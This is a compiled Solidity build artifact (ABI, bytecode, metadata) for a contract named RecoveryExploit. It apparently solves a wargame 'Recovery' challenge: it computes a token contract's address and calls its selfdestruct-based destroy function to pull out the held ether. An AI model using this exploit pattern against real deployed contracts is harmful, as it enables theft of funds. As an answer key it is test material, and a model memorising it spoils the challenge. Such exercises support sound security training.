{"abi":[{"type":"constructor","inputs":[{"name":"_recoveryInstance","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"attacker","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"calculateTokenAddress","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"recoveryInstance","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b50604051610983380380610983833981016040819052602b916057565b5f80546001600160a01b039092166001600160a01b031992831617905560018054909116331790556082565b5f602082840312156066575f5ffd5b81516001600160a01b0381168114607b575f5ffd5b9392505050565b6108f48061008f5f395ff3fe608060405260043610610041575f3560e01c806348eb76ee1461004c5780639e5faafc14610087578063b8496ec81461009d578063f775b286146100b1575f5ffd5b3661004857005b5f5ffd5b348015610057575f5ffd5b5060015461006b906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b348015610092575f5ffd5b5061009b6100cf565b005b3480156100a8575f5ffd5b5061006b61018d565b3480156100bc575f5ffd5b505f5461006b906001600160a01b031681565b5f6100d861018d565b5f546040519192506001600160a01b031690620186a0906100f890610280565b61010392919061028d565b604051809103905ff08015801561011c573d5f5f3e3d5ffd5b506040517ef55d9d0000000000000000000000000000000000000000000000000000000081523060048201526001600160a01b03919091169062f55d9d906024015f604051808303815f87803b158015610174575f5ffd5b505af1158015610186573d5f5f3e3d5ffd5b5050505050565b6040515f90819081906101a260208201610280565b601f1982820381018352601f9091011660408190525f546101d6916001600160a01b0390911690620186a0906020016102cc565b60408051601f19818403018152908290526101f49291602001610342565b60408051808303601f190181528282525f5481516020928301207fff00000000000000000000000000000000000000000000000000000000000000838601526bffffffffffffffffffffffff19606092831b1660218601526035850196909652605580850196909652825180850390960186526075909301909152835193019290922090911c92915050565b6105608061035f83390190565b606081525f6102b360608301600781526626bcaa37b5b2b760c91b602082015260400190565b6001600160a01b03949094166020830152506040015290565b606081525f6102f260608301600781526626bcaa37b5b2b760c91b602082015260400190565b90506001600160a01b038416602083015262ffffff831660408301529392505050565b5f81515f5b81811015610334576020818501810151868301520161031a565b505f93019283525090919050565b5f6103566103508386610315565b84610315565b94935050505056fe608060405234801561000f575f5ffd5b5060405161056038038061056083398101604081905261002e91610088565b5f61003984826101ed565b506001600160a01b039091165f90815260016020526040902055506102a7565b634e487b7160e01b5f52604160045260245ffd5b80516001600160a01b0381168114610083575f5ffd5b919050565b5f5f5f6060848603121561009a575f5ffd5b83516001600160401b038111156100af575f5ffd5b8401601f810186136100bf575f5ffd5b80516001600160401b038111156100d8576100d8610059565b604051601f8201601f19908116603f011681016001600160401b038111828210171561010657610106610059565b60405281815282820160200188101561011d575f5ffd5b5f5b8281101561013b5760208185018101518383018201520161011f565b505f602083830101528095505050506101566020850161006d565b6040949094015192959394509192915050565b600181811c9082168061017d57607f821691505b60208210810361019b57634e487b7160e01b5f52602260045260245ffd5b50919050565b601f8211156101e857805f5260205f20601f840160051c810160208510156101c65750805b601f840160051c820191505b818110156101e5575f81556001016101d2565b50505b505050565b81516001600160401b0381111561020657610206610059565b61021a816102148454610169565b846101a1565b6020601f82116001811461024c575f83156102355750848201515b5f19600385901b1c1916600184901b1784556101e5565b5f84815260208120601f198516915b8281101561027b578785015182556020948501946001909201910161025b565b508482101561029857868401515f19600387901b60f8161c191681555b50505050600190811b01905550565b6102ac806102b45f395ff3fe608060405260043610610035575f3560e01c8062f55d9d1461005c57806306fdde031461007d57806327e235e3146100a7575f5ffd5b366100585761004534600a610184565b335f908152600160205260409020819055005b5f5ffd5b348015610067575f5ffd5b5061007b6100763660046101d1565b6100e0565b005b348015610088575f5ffd5b506100916100f9565b60405161009e91906101f3565b60405180910390f35b3480156100b2575f5ffd5b506100d26100c13660046101d1565b60016020525f908152604090205481565b60405190815260200161009e565b8073ffffffffffffffffffffffffffffffffffffffff16ff5b5f80546101059061023e565b80601f01602080910402602001604051908101604052809291908181526020018280546101319061023e565b801561017c5780601f106101535761010080835404028352916020019161017c565b820191905f5260205f20905b81548152906001019060200180831161015f57829003601f168201915b505050505081565b80820281158282048414176101a757634e487b7160e01b5f52601160045260245ffd5b92915050565b73ffffffffffffffffffffffffffffffffffffffff811681146101ce575f5ffd5b50565b5f602082840312156101e1575f5ffd5b81356101ec816101ad565b9392505050565b602081525f82518060208401525f5b8181101561021f5760208186018101516040868401015201610202565b505f604082850101526040601f19601f83011684010191505092915050565b600181811c9082168061025257607f821691505b60208210810361027057634e487b7160e01b5f52602260045260245ffd5b5091905056fea2646970667358221220b3db37072c91672743ffb28818e39104dbb36cf72533898a77a40a01df6426be64736f6c634300081c0033a26469706673582212201eeea3e18aa48672ed39324cbc730c2262d77353df8903105aefc78d806faa0664736f6c634300081c0033","sourceMap":"559:932:0:-:0;;;657:123;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;706:16;:36;;-1:-1:-1;;;;;706:36:0;;;-1:-1:-1;;;;;;706:36:0;;;;;;;752:21;;;;;763:10;752:21;;;559:932;;14:290:1;84:6;137:2;125:9;116:7;112:23;108:32;105:52;;;153:1;150;143:12;105:52;179:16;;-1:-1:-1;;;;;224:31:1;;214:42;;204:70;;270:1;267;260:12;204:70;293:5;14:290;-1:-1:-1;;;14:290:1:o;:::-;559:932:0;;;;;;","linkReferences":{}},"deployedBytecode":{"object":"0x608060405260043610610041575f3560e01c806348eb76ee1461004c5780639e5faafc14610087578063b8496ec81461009d578063f775b286146100b1575f5ffd5b3661004857005b5f5ffd5b348015610057575f5ffd5b5060015461006b906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b348015610092575f5ffd5b5061009b6100cf565b005b3480156100a8575f5ffd5b5061006b61018d565b3480156100bc575f5ffd5b505f5461006b906001600160a01b031681565b5f6100d861018d565b5f546040519192506001600160a01b031690620186a0906100f890610280565b61010392919061028d565b604051809103905ff08015801561011c573d5f5f3e3d5ffd5b506040517ef55d9d0000000000000000000000000000000000000000000000000000000081523060048201526001600160a01b03919091169062f55d9d906024015f604051808303815f87803b158015610174575f5ffd5b505af1158015610186573d5f5f3e3d5ffd5b5050505050565b6040515f90819081906101a260208201610280565b601f1982820381018352601f9091011660408190525f546101d6916001600160a01b0390911690620186a0906020016102cc565b60408051601f19818403018152908290526101f49291602001610342565b60408051808303601f190181528282525f5481516020928301207fff00000000000000000000000000000000000000000000000000000000000000838601526bffffffffffffffffffffffff19606092831b1660218601526035850196909652605580850196909652825180850390960186526075909301909152835193019290922090911c92915050565b6105608061035f83390190565b606081525f6102b360608301600781526626bcaa37b5b2b760c91b602082015260400190565b6001600160a01b03949094166020830152506040015290565b606081525f6102f260608301600781526626bcaa37b5b2b760c91b602082015260400190565b90506001600160a01b038416602083015262ffffff831660408301529392505050565b5f81515f5b81811015610334576020818501810151868301520161031a565b505f93019283525090919050565b5f6103566103508386610315565b84610315565b94935050505056fe608060405234801561000f575f5ffd5b5060405161056038038061056083398101604081905261002e91610088565b5f61003984826101ed565b506001600160a01b039091165f90815260016020526040902055506102a7565b634e487b7160e01b5f52604160045260245ffd5b80516001600160a01b0381168114610083575f5ffd5b919050565b5f5f5f6060848603121561009a575f5ffd5b83516001600160401b038111156100af575f5ffd5b8401601f810186136100bf575f5ffd5b80516001600160401b038111156100d8576100d8610059565b604051601f8201601f19908116603f011681016001600160401b038111828210171561010657610106610059565b60405281815282820160200188101561011d575f5ffd5b5f5b8281101561013b5760208185018101518383018201520161011f565b505f602083830101528095505050506101566020850161006d565b6040949094015192959394509192915050565b600181811c9082168061017d57607f821691505b60208210810361019b57634e487b7160e01b5f52602260045260245ffd5b50919050565b601f8211156101e857805f5260205f20601f840160051c810160208510156101c65750805b601f840160051c820191505b818110156101e5575f81556001016101d2565b50505b505050565b81516001600160401b0381111561020657610206610059565b61021a816102148454610169565b846101a1565b6020601f82116001811461024c575f83156102355750848201515b5f19600385901b1c1916600184901b1784556101e5565b5f84815260208120601f198516915b8281101561027b578785015182556020948501946001909201910161025b565b508482101561029857868401515f19600387901b60f8161c191681555b50505050600190811b01905550565b6102ac806102b45f395ff3fe608060405260043610610035575f3560e01c8062f55d9d1461005c57806306fdde031461007d57806327e235e3146100a7575f5ffd5b366100585761004534600a610184565b335f908152600160205260409020819055005b5f5ffd5b348015610067575f5ffd5b5061007b6100763660046101d1565b6100e0565b005b348015610088575f5ffd5b506100916100f9565b60405161009e91906101f3565b60405180910390f35b3480156100b2575f5ffd5b506100d26100c13660046101d1565b60016020525f908152604090205481565b60405190815260200161009e565b8073ffffffffffffffffffffffffffffffffffffffff16ff5b5f80546101059061023e565b80601f01602080910402602001604051908101604052809291908181526020018280546101319061023e565b801561017c5780601f106101535761010080835404028352916020019161017c565b820191905f5260205f20905b81548152906001019060200180831161015f57829003601f168201915b505050505081565b80820281158282048414176101a757634e487b7160e01b5f52601160045260245ffd5b92915050565b73ffffffffffffffffffffffffffffffffffffffff811681146101ce575f5ffd5b50565b5f602082840312156101e1575f5ffd5b81356101ec816101ad565b9392505050565b602081525f82518060208401525f5b8181101561021f5760208186018101516040868401015201610202565b505f604082850101526040601f19601f83011684010191505092915050565b600181811c9082168061025257607f821691505b60208210810361027057634e487b7160e01b5f52602260045260245ffd5b5091905056fea2646970667358221220b3db37072c91672743ffb28818e39104dbb36cf72533898a77a40a01df6426be64736f6c634300081c0033a26469706673582212201eeea3e18aa48672ed39324cbc730c2262d77353df8903105aefc78d806faa0664736f6c634300081c0033","sourceMap":"559:932:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;627:23;;;;;;;;;;-1:-1:-1;627:23:0;;;;-1:-1:-1;;;;;627:23:0;;;;;;-1:-1:-1;;;;;178:55:1;;;160:74;;148:2;133:18;627:23:0;;;;;;;1277:177;;;;;;;;;;;;;:::i;:::-;;786:485;;;;;;;;;;;;;:::i;590:31::-;;;;;;;;;;-1:-1:-1;590:31:0;;;;-1:-1:-1;;;;;590:31:0;;;1277:177;1312:13;1328:23;:21;:23::i;:::-;1389:16;;1362:52;;1312:39;;-1:-1:-1;;;;;;1389:16:0;;1407:6;;1362:52;;;:::i;:::-;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;1361:86:0;;;;;1440:4;1361:86;;;160:74:1;-1:-1:-1;;;;;1361:62:0;;;;;;;133:18:1;;1361:86:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1302:152;1277:177::o;786:485::-;1004:30;;840:7;;;;;;1004:30;;;;;:::i;:::-;-1:-1:-1;;1004:30:0;;;;;;;;;;;;;;;;1070:16;;1048:47;;-1:-1:-1;;;;;1070:16:0;;;;1088:6;;1004:30;1048:47;;:::i;:::-;;;;-1:-1:-1;;1048:47:0;;;;;;;;;;974:131;;;1048:47;974:131;;:::i;:::-;;;;;;;-1:-1:-1;;974:131:0;;;;;;1115:12;1171:16;1195:19;;974:131;1195:19;;;;1157:12;1140:75;;;2442:92:1;-1:-1:-1;;2571:2:1;2567:15;;;;2550:11;;;2543:74;2633:12;;;2626:28;;;;2670:12;;;;2663:28;;;;1140:75:0;;;;;;;;;;2707:12:1;;;;1140:75:0;;;1130:86;;;;;;;;1241:22;;;;;-1:-1:-1;;786:485:0:o;-1:-1:-1:-;;;;;;;;:::o;405:481:1:-;676:2;665:9;658:21;639:4;696:49;741:2;730:9;726:18;322:1;310:14;;-1:-1:-1;;;349:4:1;340:14;;333:33;391:2;382:12;;245:155;696:49;-1:-1:-1;;;;;781:55:1;;;;776:2;761:18;;754:83;-1:-1:-1;868:2:1;853:18;846:34;688:57;405:481::o;1138:495::-;1408:2;1397:9;1390:21;1371:4;1428:49;1473:2;1462:9;1458:18;322:1;310:14;;-1:-1:-1;;;349:4:1;340:14;;333:33;391:2;382:12;;245:155;1428:49;1420:57;;-1:-1:-1;;;;;1517:6:1;1513:55;1508:2;1497:9;1493:18;1486:83;1617:8;1609:6;1605:21;1600:2;1589:9;1585:18;1578:49;1138:495;;;;;:::o;1638:322::-;1679:3;1717:5;1711:12;1741:1;1751:128;1765:6;1762:1;1759:13;1751:128;;;1862:4;1847:13;;;1843:24;;1837:31;1824:11;;;1817:52;1780:12;1751:128;;;-1:-1:-1;1934:1:1;1898:16;;1923:13;;;-1:-1:-1;1898:16:1;;1638:322;-1:-1:-1;1638:322:1:o;1965:261::-;2140:3;2165:55;2190:29;2215:3;2207:6;2190:29;:::i;:::-;2182:6;2165:55;:::i;:::-;2158:62;1965:261;-1:-1:-1;;;;1965:261:1:o","linkReferences":{}},"methodIdentifiers":{"attack()":"9e5faafc","attacker()":"48eb76ee","calculateTokenAddress()":"b8496ec8","recoveryInstance()":"f775b286"},"rawMetadata":"{\"compiler\":{\"version\":\"0.8.28+commit.7893614a\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_recoveryInstance\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"attack\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"attacker\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"calculateTokenAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"recoveryInstance\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"src/answers/RecoveryExploit.sol\":\"RecoveryExploit\"},\"evmVersion\":\"shanghai\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":true,\"runs\":1000},\"remappings\":[\":ds-test/=lib/openzeppelin-contracts-upgradeable/lib/forge-std/lib/ds-test/src/\",\":erc4626-tests/=lib/openzeppelin-contracts-upgradeable/lib/erc4626-tests/\",\":forge-std/=lib/forge-std/src/\",\":openzeppelin-contracts-06/=lib/openzeppelin-contracts-06/contracts/\",\":openzeppelin-contracts-08/=lib/openzeppelin-contracts-08/contracts/\",\":openzeppelin-contracts-upgradeable/=lib/openzeppelin-contracts-upgradeable/\",\":openzeppelin-upgradeable/=lib/openzeppelin-contracts-upgradeable/contracts/\",\":openzeppelin/=lib/openzeppelin-contracts-upgradeable/contracts/\"]},\"sources\":{\"src/answers/RecoveryExploit.sol\":{\"keccak256\":\"0xdd845fb8594df8e1e179cef23bc6549cba2f10402b4e042b80fe374825fb99d3\",\"urls\":[\"bzz-raw://3abd73c7273cdb15e65a3bb1ac1f9d7c4fcb0556ef03dc7978d32a0947be95fd\",\"dweb:/ipfs/QmYtYH2MmbFCck6vDFd3pKgX6pHs63RorgdnCN3VCn2sbQ\"]}},\"version\":1}","metadata":{"compiler":{"version":"0.8.28+commit.7893614a"},"language":"Solidity","output":{"abi":[{"inputs":[{"internalType":"address","name":"_recoveryInstance","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"stateMutability":"nonpayable","type":"function","name":"attack"},{"inputs":[],"stateMutability":"view","type":"function","name":"attacker","outputs":[{"internalType":"address","name":"","type":"address"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"calculateTokenAddress","outputs":[{"internalType":"address","name":"","type":"address"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"recoveryInstance","outputs":[{"internalType":"address","name":"","type":"address"}]},{"inputs":[],"stateMutability":"payable","type":"receive"}],"devdoc":{"kind":"dev","methods":{},"version":1},"userdoc":{"kind":"user","methods":{},"version":1}},"settings":{"remappings":["ds-test/=lib/openzeppelin-contracts-upgradeable/lib/forge-std/lib/ds-test/src/","erc4626-tests/=lib/openzeppelin-contracts-upgradeable/lib/erc4626-tests/","forge-std/=lib/forge-std/src/","openzeppelin-contracts-06/=lib/openzeppelin-contracts-06/contracts/","openzeppelin-contracts-08/=lib/openzeppelin-contracts-08/contracts/","openzeppelin-contracts-upgradeable/=lib/openzeppelin-contracts-upgradeable/","openzeppelin-upgradeable/=lib/openzeppelin-contracts-upgradeable/contracts/","openzeppelin/=lib/openzeppelin-contracts-upgradeable/contracts/"],"optimizer":{"enabled":true,"runs":1000},"metadata":{"bytecodeHash":"ipfs"},"compilationTarget":{"src/answers/RecoveryExploit.sol":"RecoveryExploit"},"evmVersion":"shanghai","libraries":{}},"sources":{"src/answers/RecoveryExploit.sol":{"keccak256":"0xdd845fb8594df8e1e179cef23bc6549cba2f10402b4e042b80fe374825fb99d3","urls":["bzz-raw://3abd73c7273cdb15e65a3bb1ac1f9d7c4fcb0556ef03dc7978d32a0947be95fd","dweb:/ipfs/QmYtYH2MmbFCck6vDFd3pKgX6pHs63RorgdnCN3VCn2sbQ"],"license":null}},"version":1},"id":0}